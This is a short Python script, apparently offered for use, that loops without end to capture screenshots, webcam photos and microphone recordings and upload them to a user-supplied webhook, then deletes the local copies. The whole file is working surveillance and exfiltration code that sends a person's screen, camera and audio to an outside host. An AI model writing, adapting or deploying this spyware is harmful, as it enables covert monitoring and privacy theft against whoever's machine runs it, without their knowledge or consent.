import os
import time
import requests
import pyautogui
import cv2
import sounddevice as sd
import soundfile as sf
from zipfile import ZipFile

# How much time to wait before each screenshot, webcam picture, and microphone recording ( in seconds )
wait_time = 5
webhook = "YOUR_WEBHOOK_HERE"
compile_to_zip = "y or n"

# Take a screenshot
def screenshot():
    time.sleep(wait_time)
    print("Taking screenshot...")
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    print("Screenshot taken")

# Take a webcam picture
def webcam():
    time.sleep(wait_time)
    print("Taking picture...")
    webcam = cv2.VideoCapture(0)
    return_value, image = webcam.read()
    cv2.imwrite("webcam.png", image)
    webcam.release()
    print("Picture taken")

# Take a microphone recording using sounddevice
def microphone():
    time.sleep(wait_time)
    print("Recording...")
    fs = 44100
    seconds = 10
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    sf.write("microphone.mp3", myrecording, fs)
    print("Recording complete")

# If the user wants to compile the files into a zip file, this function will do that
def zip_files():
    # Create a zip file
    print("Zipping files...")
    with ZipFile("files.zip", "w") as zip:
        zip.write(f"screenshot.png")
        zip.write(f"webcam.png")
        zip.write(f"microphone.mp3")
    file = {"file": open("files.zip", "rb")}
    print("Files zipped")
    requests.post(webhook, files=file)
    print("sent zip file")
    # Remove the files
    print("Removing files...")
    os.remove("screenshot.png")
    os.remove("webcam.png")
    os.remove("microphone.mp3")
    print("Files removed")

# Else if the user doesn't want to compile the files into a zip file, this function will run the script and send the files one by one
def send_files():
    # Send the screenshot
    print("Sending screenshot...")
    file = {"file": open("screenshot.png", "rb")}
    requests.post(webhook, files=file)
    print("Screenshot sent")
    # Send the webcam picture
    print("Sending picture...")
    file = {"file": open("webcam.png", "rb")}
    requests.post(webhook, files=file)
    print("Picture sent")
    # Send the microphone recording
    print("Sending recording...")
    file = {"file": open("microphone.mp3", "rb")}
    requests.post(webhook, files=file)
    print("Recording sent")
    # Remove the files
    print("Removing files...")
    os.remove("screenshot.png")
    os.remove("webcam.png")
    os.remove("microphone.mp3")
    print("Files removed")

# Run the script
if compile_to_zip == "y":
    while True:
        screenshot()
        webcam()
        microphone()
        zip_files()
else:
    while True:
        screenshot()
        webcam()
        microphone()
        send_files()
